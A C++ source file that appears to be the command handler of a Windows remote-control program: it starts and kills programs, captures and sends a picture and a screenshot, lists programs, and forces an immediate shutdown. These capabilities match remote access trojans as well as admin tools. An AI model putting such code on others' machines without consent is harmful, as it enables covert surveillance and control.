#include "executeCommand.h"

void execute_command(const string& command) {
  cout << "[Command]: " << command << endl;

  // Trim whitespace from command
  string trimmed_cmd = command;
  trimmed_cmd.erase(trimmed_cmd.begin(),
                    find_if(trimmed_cmd.begin(), trimmed_cmd.end(),
                            [](int ch) { return !isspace(ch); }));
  trimmed_cmd.erase(find_if(trimmed_cmd.rbegin(), trimmed_cmd.rend(),
                            [](int ch) { return !isspace(ch); })
                        .base(),
                    trimmed_cmd.end());

  if (trimmed_cmd.empty()) {
    cout << "Empty command received" << endl;
    return;
  }

  if (trimmed_cmd.find("start_program") == 0) {
    string prog = trimmed_cmd.substr(13);  // after "start_program"
    prog.erase(prog.begin(), find_if(prog.begin(), prog.end(), [](int ch) {
                 return !isspace(ch);
               }));  // trim left

    if (!prog.empty()) {
      cout << "Starting program: " << prog << endl;
      HINSTANCE result =
          ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
      if (reinterpret_cast<INT_PTR>(result) <= 32) {
        cerr << "Failed to start program. Error code: "
             << reinterpret_cast<INT_PTR>(result) << endl;
      }
    }
  } else if (trimmed_cmd.find("shutdown_program") == 0) {
    string proc = trimmed_cmd.substr(16);
    proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
                                     [](int ch) { return !isspace(ch); }));
    if (!proc.empty()) {
      shutdown_program(proc);
    }
  } else if (trimmed_cmd.find("get_picture") == 0) {
    send_picture();
  } else if (trimmed_cmd.find("get_screenshot") == 0) {
    send_screenshot();
  }else if (trimmed_cmd.find("list_program") == 0) {
    list_programs();
  } else if (trimmed_cmd.find("shutdown") == 0) {
    cout << "Initiating system shutdown..." << endl;
    if (system("shutdown /s /t 0") != 0) {
      cerr << "Shutdown command failed" << endl;
    }
  } else {
    cout << "Unknown command: " << trimmed_cmd << endl;
  }
}